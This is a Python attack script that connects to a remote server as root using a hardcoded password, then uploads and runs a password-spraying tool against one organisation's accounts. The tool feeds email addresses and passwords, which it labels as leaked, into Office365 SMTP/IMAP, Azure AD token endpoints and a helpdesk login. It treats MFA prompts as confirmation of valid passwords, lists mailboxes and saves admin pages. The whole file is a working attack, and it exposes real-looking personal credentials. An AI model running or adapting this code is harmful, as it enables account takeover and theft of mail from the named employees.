import paramiko, sys

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect('64.177.88.10', username='root', password='5F.jyTK$D6%.F{a=', timeout=10)
print('Connected', flush=True)

SCRIPT = r'''
import smtplib, requests, urllib3, json, sys, time, base64, re
urllib3.disable_warnings()
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

# ========================================
# CREDENTIALS FROM INTELX DUMP
# ========================================
SMTP_CREDS = [
    ("jsanchezfern@findep.global", "AFI2022*"),
    ("jsanchezfern@findep.global", "afi2022*"),
    ("bemedezar@findep.global", "AFI2022*"),
    ("admin@findep.global", "4dm1n##*2411"),
    ("admin@findep.global", "BcF1s42o2d*"),
    ("mmartinez@findep.global", "Rul76846"),
    ("mmartinez@findep.global", "rul76846"),
    ("jeff@findep.global", "AFI2022*"),
    ("jeff@findep.global", "4dm1n##*2411"),
    ("jeff@findep.global", "BcF1s42o2d*"),
    ("jeff@findep.global", "Rul76846"),
    ("jeff@findep.global", "Pao1234+"),
]

# ========================================
# 1. SMTP SPRAY (Office365)
# ========================================
sys.stdout.write("=" * 60 + "\n=== SMTP SPRAY (smtp.office365.com:587) ===\n" + "=" * 60 + "\n\n")

smtp_hits = []
for email, password in SMTP_CREDS:
    try:
        srv = smtplib.SMTP("smtp.office365.com", 587, timeout=10)
        srv.ehlo()
        srv.starttls()
        srv.ehlo()
        srv.login(email, password)
        sys.stdout.write(f"  *** HIT *** {email}:{password}\n")
        smtp_hits.append((email, password))
        srv.quit()
    except smtplib.SMTPAuthenticationError as e:
        code = e.smtp_code
        msg = str(e.smtp_error)[:80]
        sys.stdout.write(f"  FAIL {email}:{password} — {code} {msg}\n")
    except Exception as e:
        sys.stdout.write(f"  ERR  {email}:{password} — {str(e)[:60]}\n")
    time.sleep(1.5)
    sys.stdout.flush()

sys.stdout.write(f"\nSMTP hits: {len(smtp_hits)}\n")

# ========================================
# 2. IMAP SPRAY (if SMTP fails, try IMAP)
# ========================================
sys.stdout.write("\n" + "=" * 60 + "\n=== IMAP SPRAY (outlook.office365.com:993) ===\n" + "=" * 60 + "\n\n")

import imaplib
for email, password in SMTP_CREDS:
    try:
        imap = imaplib.IMAP4_SSL("outlook.office365.com", 993, timeout=10)
        imap.login(email, password)
        sys.stdout.write(f"  *** HIT *** {email}:{password}\n")
        # List mailboxes
        status, mboxes = imap.list()
        sys.stdout.write(f"  Mailboxes: {len(mboxes)}\n")
        for mb in mboxes[:5]:
            sys.stdout.write(f"    {mb.decode(errors='replace')[:80]}\n")
        imap.logout()
    except Exception as e:
        err = str(e)[:80]
        sys.stdout.write(f"  FAIL {email}:{password} — {err}\n")
    time.sleep(1.5)
    sys.stdout.flush()


# ========================================
# 3. AZURE AD ROPC — jeff@findep.global
# ========================================
sys.stdout.write("\n" + "=" * 60 + "\n=== AZURE AD ROPC — jeff@findep.global ===\n" + "=" * 60 + "\n\n")

TENANT_GLOBAL = "30fcec21-d05d-4ca6-8233-a90183fc7dbd"
CLIENTS = [
    ("1fec8e78-bce4-4aaf-ab1b-5451cc387264", "Microsoft Teams"),
    ("d3590ed6-52b3-4102-aeff-aad2292ab01c", "MS Office"),
    ("1b730954-1685-4b74-9bfd-dac224a7b894", "Azure CLI"),
    ("04b07795-8ddb-461a-bbee-02f9e1bf7b46", "Azure CLI 2"),
]

jeff_passwords = ["AFI2022*", "4dm1n##*2411", "BcF1s42o2d*", "Rul76846", "rul76846", "Pao1234+",
                  "Findep2022*", "Findep2023*", "jeff2022*", "Jeff2022*", "Welcome1", "Password1!"]

for pw in jeff_passwords:
    for cid, cname in CLIENTS[:1]:
        try:
            r = requests.post(f"https://login.microsoftonline.com/{TENANT_GLOBAL}/oauth2/v2.0/token",
                data={
                    "grant_type": "password",
                    "client_id": cid,
                    "username": f"jeff@findep.global",
                    "password": pw,
                    "scope": "openid profile email"
                }, timeout=10)
            
            if r.status_code == 200:
                sys.stdout.write(f"  *** HIT *** jeff@findep.global:{pw} ({cname})\n")
                token_data = r.json()
                sys.stdout.write(f"  Token type: {token_data.get('token_type')}\n")
                # Decode JWT
                access = token_data.get("access_token", "")
                if access:
                    parts = access.split(".")
                    if len(parts) >= 2:
                        payload = json.loads(base64.urlsafe_b64decode(parts[1] + "=="))
                        sys.stdout.write(f"  UPN: {payload.get('upn')}\n")
                        sys.stdout.write(f"  Name: {payload.get('name')}\n")
                        sys.stdout.write(f"  Roles: {payload.get('roles', [])}\n")
            else:
                err_code = r.json().get("error", "?")
                err_desc = r.json().get("error_description", "?")[:80]
                locked = "AADSTS50053" in err_desc
                not_found = "AADSTS50034" in err_desc
                bad_pw = "AADSTS50126" in err_desc
                mfa = "AADSTS50076" in err_desc or "AADSTS50079" in err_desc
                
                tag = ""
                if locked: tag = " [LOCKED]"
                elif not_found: tag = " [NOT FOUND]"
                elif bad_pw: tag = " [BAD PW]"
                elif mfa: tag = " [MFA REQUIRED !!!]"
                
                sys.stdout.write(f"  {err_code}{tag} jeff:{pw}\n")
                
                if not_found:
                    sys.stdout.write(f"  >>> jeff@findep.global DOES NOT EXIST — skipping rest\n")
                    jeff_passwords = []
                    break
                if locked:
                    sys.stdout.write(f"  >>> LOCKED — stopping spray\n")
                    jeff_passwords = []
                    break
                if mfa:
                    sys.stdout.write(f"  >>> MFA REQUIRED — password {pw} IS VALID!\n")
                    jeff_passwords = []
                    break
        except Exception as e:
            sys.stdout.write(f"  ERR jeff:{pw} — {str(e)[:60]}\n")
        time.sleep(2)
        sys.stdout.flush()


# ========================================
# 4. AZURE AD — try other users we haven't tried recently
# ========================================
sys.stdout.write("\n" + "=" * 60 + "\n=== AZURE AD — jsanchezfern + bemedezar ===\n" + "=" * 60 + "\n\n")

other_creds = [
    ("jsanchezfern@findep.global", "AFI2022*"),
    ("bemedezar@findep.global", "AFI2022*"),
    ("mmartinez@findep.global", "Rul76846"),
]

for email, pw in other_creds:
    try:
        r = requests.post(f"https://login.microsoftonline.com/{TENANT_GLOBAL}/oauth2/v2.0/token",
            data={
                "grant_type": "password",
                "client_id": "1fec8e78-bce4-4aaf-ab1b-5451cc387264",
                "username": email,
                "password": pw,
                "scope": "openid profile email"
            }, timeout=10)
        
        if r.status_code == 200:
            sys.stdout.write(f"  *** HIT *** {email}:{pw}\n")
            token_data = r.json()
            access = token_data.get("access_token", "")
            if access:
                parts = access.split(".")
                if len(parts) >= 2:
                    payload = json.loads(base64.urlsafe_b64decode(parts[1] + "=="))
                    sys.stdout.write(f"  UPN: {payload.get('upn')}\n")
                    sys.stdout.write(f"  Name: {payload.get('name')}\n")
        else:
            err_desc = r.json().get("error_description", "?")[:100]
            locked = "AADSTS50053" in err_desc
            bad_pw = "AADSTS50126" in err_desc
            mfa = "AADSTS50076" in err_desc or "AADSTS50079" in err_desc
            disabled = "AADSTS50057" in err_desc
            
            tag = ""
            if locked: tag = "[LOCKED]"
            elif bad_pw: tag = "[BAD PW]"
            elif mfa: tag = "[MFA REQ — PW VALID!]"
            elif disabled: tag = "[DISABLED]"
            
            sys.stdout.write(f"  {tag} {email}:{pw} — {err_desc[:80]}\n")
    except Exception as e:
        sys.stdout.write(f"  ERR {email}:{pw} — {str(e)[:60]}\n")
    time.sleep(2)
    sys.stdout.flush()


# ========================================
# 5. FOOTPRINTS — try jeff and other combos
# ========================================
sys.stdout.write("\n" + "=" * 60 + "\n=== FOOTPRINTS SPRAY ===\n" + "=" * 60 + "\n\n")

PAO = "https://pao.findep.com.mx"
fp_creds = [
    ("jeff", "AFI2022*"),
    ("jeff", "4dm1n##*2411"),
    ("jeff", "BcF1s42o2d*"),
    ("jeff", "Rul76846"),
    ("jeff", "Pao1234+"),
    ("jsanchezfern", "AFI2022*"),
    ("jsanchezfern", "Pao1234+"),
    ("mmartinez", "Rul76846"),
    ("mmartinez", "Pao1234+"),
    ("hgarciaar", "Pao1234+"),
    ("hgarciaar", "AFI2022*"),
    ("cguerrave", "Pao1234+"),
    ("cguerrave", "AFI2022*"),
    ("mcarrillo", "Pao1234+"),
    ("mcarrillo", "AFI2022*"),
    ("jreyes", "Pao1234+"),
    ("cronquillo", "Pao1234+"),
    ("admin", "4dm1n##*2411"),
    ("admin", "BcF1s42o2d*"),
    ("admin", "AFI2022*"),
    ("admin", "Pao1234+"),
    ("MRAdmin", "4dm1n##*2411"),
    ("MRAdmin", "BcF1s42o2d*"),
    ("MRAdmin", "AFI2022*"),
]

for user, pw in fp_creds:
    try:
        s = requests.Session()
        s.verify = False
        s.headers.update({"User-Agent": UA})
        r = s.post(f"{PAO}/MRcgi/MRlogin.pl",
            data={"USER": user, "PASSWORD": pw, "USERID": user,
                  "MRSubmit": "Submit", "PROJECTID": "1", "LASTSTEP": "1"},
            timeout=15, allow_redirects=True)
        
        has_mrp = 'NAME=MRP' in r.text
        has_custuser = 'CUSTUSER' in r.text
        has_homepage = 'MRhomepage.pl' in r.text
        is_login_page = 'loginSigninBtn' in r.text or 'MRlogin.pl' in r.text[:3000]
        is_error = 'errorMessages' in r.text
        sz = len(r.text)
        
        if has_mrp and has_homepage:
            tag = "*** LOGIN OK ***"
            if has_custuser:
                tag += " (CUSTOMER)"
            else:
                tag += " (AGENT/ADMIN?!)"
        elif is_login_page:
            tag = "FAIL (login page)"
        elif is_error:
            tag = "FAIL (error)"
        else:
            tag = f"??? ({sz}b)"
        
        sys.stdout.write(f"  {tag} {user}:{pw}\n")
        
        if has_mrp and has_homepage and not has_custuser:
            sys.stdout.write(f"    >>> AGENT/ADMIN LOGIN — SAVING FULL RESPONSE\n")
            with open(f'/root/fp_agent_{user}.html', 'w') as f:
                f.write(r.text)
    except Exception as e:
        sys.stdout.write(f"  ERR {user}:{pw} — {str(e)[:60]}\n")
    time.sleep(1)
    sys.stdout.flush()


# ========================================
# 6. FINDEP.DEV AZURE AD TENANT
# ========================================
sys.stdout.write("\n" + "=" * 60 + "\n=== AZURE AD — findep.dev ===\n" + "=" * 60 + "\n\n")

# First discover the tenant
try:
    r = requests.get("https://login.microsoftonline.com/findep.dev/.well-known/openid-configuration", timeout=10)
    if r.status_code == 200:
        tenant_dev = r.json().get("issuer", "").split("/")[3] if "/" in r.json().get("issuer", "") else "?"
        sys.stdout.write(f"  findep.dev tenant: {tenant_dev}\n")
    else:
        sys.stdout.write(f"  findep.dev tenant not found: {r.status_code}\n")
        tenant_dev = None
except Exception as e:
    sys.stdout.write(f"  ERR: {str(e)[:60]}\n")
    tenant_dev = None

# Also try findep.mx and findep.com.mx
for domain in ["findep.mx", "findep.com.mx"]:
    try:
        r = requests.get(f"https://login.microsoftonline.com/{domain}/.well-known/openid-configuration", timeout=10)
        if r.status_code == 200:
            tid = r.json().get("issuer", "").split("/")[3] if "/" in r.json().get("issuer", "") else "?"
            sys.stdout.write(f"  {domain} tenant: {tid}\n")
        else:
            sys.stdout.write(f"  {domain}: {r.status_code}\n")
    except Exception as e:
        sys.stdout.write(f"  {domain} ERR: {str(e)[:60]}\n")

# Spray against findep.dev if tenant exists
if tenant_dev:
    dev_creds = [
        ("jeff@findep.dev", "AFI2022*"),
        ("bmendezar@findep.dev", "AFI2022*"),
        ("bmendezar@findep.dev", "Pao1234+"),
        ("jsanchezfern@findep.dev", "AFI2022*"),
        ("mmartinez@findep.dev", "Rul76846"),
        ("admin@findep.dev", "4dm1n##*2411"),
    ]
    
    for email, pw in dev_creds:
        try:
            r = requests.post(f"https://login.microsoftonline.com/{tenant_dev}/oauth2/v2.0/token",
                data={
                    "grant_type": "password",
                    "client_id": "1fec8e78-bce4-4aaf-ab1b-5451cc387264",
                    "username": email,
                    "password": pw,
                    "scope": "openid profile email"
                }, timeout=10)
            
            if r.status_code == 200:
                sys.stdout.write(f"  *** HIT *** {email}:{pw}\n")
            else:
                err_desc = r.json().get("error_description", "?")[:80]
                locked = "50053" in err_desc
                not_found = "50034" in err_desc
                bad_pw = "50126" in err_desc
                mfa = "50076" in err_desc or "50079" in err_desc
                
                tag = ""
                if locked: tag = "[LOCKED]"
                elif not_found: tag = "[NOT FOUND]"
                elif bad_pw: tag = "[BAD PW]"
                elif mfa: tag = "[MFA — PW VALID!]"
                
                sys.stdout.write(f"  {tag} {email}:{pw}\n")
        except Exception as e:
            sys.stdout.write(f"  ERR {email}:{pw} — {str(e)[:60]}\n")
        time.sleep(2)
        sys.stdout.flush()


sys.stdout.write("\n\n=== ALL DONE ===\n")
sys.stdout.flush()
'''

sftp = ssh.open_sftp()
with sftp.open('/root/fp_smtp_jeff.py', 'w') as f:
    f.write(SCRIPT)
sftp.close()
print('Uploaded', flush=True)

stdin, stdout, stderr = ssh.exec_command('python3 -u /root/fp_smtp_jeff.py 2>&1', timeout=300)
out = stdout.read().decode(errors='replace')
print(out, flush=True)
ssh.close()
print('Fin.', flush=True)
